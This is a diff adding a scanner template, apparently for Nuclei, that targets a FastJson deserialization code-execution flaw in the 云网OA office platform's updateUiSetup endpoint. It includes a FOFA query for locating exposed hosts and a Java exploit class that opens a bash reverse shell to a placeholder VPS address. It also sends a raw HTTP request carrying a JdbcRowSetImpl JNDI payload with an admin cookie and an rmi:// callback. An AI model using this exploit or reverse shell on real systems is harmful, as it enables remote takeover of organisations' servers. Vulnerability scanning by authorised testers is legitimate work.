@@ -1,0 +1,48 @@
+id: yunwang-oa-updateuisetup-fastjson-rce
+info:
+  name: 云网OA updateUiSetup 接口 FastJson 反序列化代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="云网OA"
+        云网OA（一米OA）基于Spring Boot + Vue3架构的企业级低代码办公平台，支持MySQL/Oracle数据库及私有化部署。
+        反序列化利用链示例：
+        
+        public class Exploit {
+            public Exploit(){
+                try {
+                    java.lang.Runtime.getRuntime().exec(
+                            new String[]{"bash", "-c", "bash -i >& /dev/tcp/VPS地址/12345 0>&1"});
+                }
+                catch(Exception e){
+                    e.printStackTrace();
+                }
+            }
+            public static void main(String[] argv){
+                Exploit e = new Exploit();
+            }
+        }
+        
+  tags: 云网OA
+http:
+- raw:
+  - |
+    POST /oa//setup/updateUiSetup HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: skincode=lte; name=admin; pwd=; JSESSIONID=85F37A117572BE90EA4BA0ED10F77EF5
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    uiSetup={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{interactsh-url}}/Exploit", "autoCommit":true}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
